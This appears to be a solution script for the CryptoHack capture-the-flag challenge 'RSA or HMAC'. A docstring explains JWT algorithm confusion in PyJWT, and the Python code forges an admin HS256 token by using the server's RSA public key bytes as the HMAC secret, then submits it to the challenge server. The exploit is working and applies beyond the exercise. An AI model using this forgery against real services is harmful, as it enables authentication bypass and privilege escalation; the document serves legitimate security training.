"""
RSA or HMAC (35pts) — JWT / HS256-RS256 key confusion

    decoded = jwt.decode(token, PUBLIC_KEY, algorithms=['HS256', 'RS256'])

PyJWT here accepts both algorithms with the SAME key parameter. For RS256
the public key is correct for signature verification; for HS256 the key is
treated as the HMAC secret — so if we forge an HS256 token signed with the
**bytes of the public key**, PyJWT happily HMAC-verifies it.

Steps:
  1. GET /get_pubkey/ to retrieve the PEM public key
  2. HS256-sign a forged payload using those PEM bytes as the HMAC secret
  3. Submit to /authorise/
"""
import base64
import hashlib
import hmac
import json

import requests

BASE = "https://web.cryptohack.org/rsa-or-hmac"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def main():
    pub = requests.get(f"{BASE}/get_pubkey/", timeout=15).json()["pubkey"]
    pub_bytes = pub.encode() if isinstance(pub, str) else pub
    print(f"[*] pubkey ({len(pub_bytes)} bytes)")

    # Manually construct HS256 JWT (PyJWT refuses to let us use a PEM as
    # an HMAC secret, but the server's PyJWT is old enough to accept it).
    header = {"typ": "JWT", "alg": "HS256"}
    payload = {"username": "admin", "admin": True}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(pub_bytes, signing_input, hashlib.sha256).digest()
    token = f"{h}.{p}.{b64url(sig)}"
    print(f"[*] forged token = {token}")

    r = requests.get(f"{BASE}/authorise/{token}/", timeout=15)
    print(f"[+] {r.json()}")


if __name__ == "__main__":
    main()
